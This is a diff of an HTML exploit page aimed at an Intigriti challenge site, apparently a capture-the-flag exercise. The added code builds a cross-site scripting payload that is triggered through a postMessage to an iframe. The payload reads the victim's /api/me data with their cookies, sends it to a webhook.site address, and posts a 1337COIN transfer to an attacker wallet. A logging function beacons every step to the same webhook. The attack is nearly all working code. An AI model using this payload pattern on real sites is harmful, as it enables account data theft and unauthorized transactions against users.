@@ -2,11 +2,11 @@
 <html>
 <head><title>FINAL</title></head>
 <body>
-<h1>FINAL EXPLOIT</h1>
 <div id="log"></div>
 <script>
 const T = 'https://challenge-0126.intigriti.io';
-const W = 'https://webhook.site/83b6e986-a7e7-4575-8e66-86976d6b8954';
+const W = 'https://webhook.site/4ef6fff2-d35d-411e-baae-13ba21343475';
+const WALLET = '16472226db03703a192aa383237035a69f';
 let s = 0;
 
 function log(m) { s++; document.getElementById('log').innerHTML += '<div>['+s+'] '+m+'</div>'; new Image().src = W+'/?'+s+'='+encodeURIComponent(m); }
@@ -14,8 +14,25 @@ function log(m) { s++; document.getElementById('log').innerHTML += '<div>['+s+']
 async function exploit() {
     log('STARTING FINAL EXPLOIT');
 
-    // HTML entity XSS payload - will execute when rendered in marketwatch
-    const xssPayload = '&lt;img src=x onerror=&quot;alert(\'gigawatz\');fetch(\''+W+'/?XSS_SUCCESS=1\',{mode:\'no-cors\'})&quot;&gt;';
+    // XSS payload that will execute on challenge domain with admin cookies
+    // Steps: 1) Get flag, 2) Send coin, 3) Report success
+    const xssPayload = `&lt;img src=x onerror=&quot;
+        // Step 1: Steal flag from /api/me
+        fetch('${T}/api/me',{credentials:'include'}).then(r=>r.json()).then(d=>{
+            fetch('${W}/?FLAG='+encodeURIComponent(JSON.stringify(d)),{mode:'no-cors'});
+            // Step 2: Send 1 1337COIN to our wallet
+            fetch('${T}/api/transaction',{
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                credentials:'include',
+                body:JSON.stringify({
+                    toAddress:'${WALLET}',
+                    currency:'1337COIN',
+                    amount:1
+                })
+            }).then(()=>fetch('${W}/?COIN_SENT=1',{mode:'no-cors'}));
+        });
+    &quot;&gt;`;
 
     log('Loading checkout iframe...');
     const iframe = document.createElement('iframe');
@@ -38,11 +55,9 @@ async function exploit() {
     }, '*');
     log('postMessage sent');
 
-    // Wait for transaction to process
+    // Wait and redirect to marketwatch where XSS triggers
     await new Promise(r => setTimeout(r, 3000));
-
-    // Redirect to marketwatch where XSS will trigger
-    log('Redirecting to marketwatch...');
+    log('Redirecting to marketwatch (XSS will trigger)...');
     window.location.href = T + '/marketwatch.html';
 }
 
